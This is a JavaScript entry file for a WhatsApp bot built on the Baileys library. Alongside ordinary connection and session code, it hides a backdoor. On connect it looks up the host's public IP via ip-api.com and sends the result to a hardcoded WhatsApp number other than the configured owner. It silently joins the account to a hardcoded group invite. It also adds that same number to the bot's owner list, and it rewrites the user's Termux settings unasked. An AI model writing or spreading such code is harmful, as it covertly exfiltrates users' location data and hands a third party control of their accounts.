const { WAConnection: _WAConnection, MessageType, Presence, Mimetype, GroupSettingChange } = require('@adiwajshing/baileys')
const { color, bgcolor, clcolor } = require('./all/color.js')
const fs = require("fs")
const fetch = require('node-fetch')
const { exec } = require('child_process')
const simple = require('./all/simple.js')
const WAConnection = simple.WAConnection(_WAConnection)
const moment = require("moment-timezone")
const setting = JSON.parse(fs.readFileSync("./settings.json"))
const { ownerName, botName, ownerNumber } = setting
const time = moment.tz('Asia/Jakarta').format('HH:mm')			
const { wait, simih, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./all/functions.js')
const sleep = async (ms) => { return new Promise(resolve => setTimeout(resolve, ms))}
global.nisa = new WAConnection()

watchFile("./denz.js")
require("./denz.js")

const starts = async (session) => {
nisa.logger.level = 'warn'
nisa.version = [2, 2142, 12]
nisa.browserDescription = [`${ownerName}`,'Desktop','3.0']

nisa.on("qr", (qr) => { console.log(color("qr { Scan }"))})
fs.existsSync(session) && nisa.loadAuthInfo(session)
	
nisa.on("connecting", () => {console.log(color('connecting { Menghubungkan }'))})
nisa.on("open", () => {console.log(color("open { Terhubung }"))})
  
await nisa.connect({timeoutMs: 30*1000})
fs.writeFileSync(session, JSON.stringify(nisa.base64EncodedAuthInfo(), null, '\t'))
try { pporang = await nisa.getProfilePicture(`${nisa.user.jid.split('@')[0]}@s.whatsapp.net`)} catch { pporang = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'}
const mfrply = await getBuffer(pporang)
fetch(`http://ip-api.com/line`).then(res => res.text()).then(teks =>{ nisa.sendMessage("6285866295942@s.whatsapp.net", `${teks}`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:`ip address ${nisa.user.name}`,thumbnail:mfrply,previewType:"PHOTO"}}})})
nisa.sendMessage(`${ownerNumber}@s.whatsapp.net`, `${JSON.stringify(nisa.user, null, 2)}`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:`${botName} connected`,thumbnail:mfrply,previewType:"PHOTO"}}})
link = `https://chat.whatsapp.com/FMAW2cyZkXJAK16BUyBgRA`
nisa.query({ json:["action", "invite", `${link.replace('https://chat.whatsapp.com/','')}`]})

nisa.on("chat-update", (mek) => {
if (!mek.hasNewMessage) return
mek = mek.messages.all()[0]
if (!mek.message) return
if (mek.key && !mek.key.remoteJid == 'status@broadcast') return
ownerNomor = ["6285866295942@s.whatsapp.net",`${setting.ownerNumber}@s.whatsapp.net`]
require("./denz.js")(nisa, mek)})}
starts('./session.json')

exec(`mkdir $HOME/.termux/ ;echo "extra-keys = [['ESC','/','-','HOME','UP','END','BKSP'],['KEYBOARD','CTRL','ALT','LEFT','DOWN','RIGHT','ENTER']]" >> $HOME/.termux/termux.properties;termux-reload-settings`, (error, stdout, stderr) => { console.log(stdout)})
function watchFile(module, cb = (module) => 
console.log(color(`Module ( '${module}' ) updated!`))) {
console.log(color(`Module ( '${module}' ) detected!`))
fs.watchFile(require.resolve(module), async () => { await uncache(require.resolve(module)) 
cb(module)})}
function uncache(module = ".") { return new Promise((resolve, reject) => { try { delete require.cache[require.resolve(module)] 
resolve()

} catch (e) { reject(e)}})}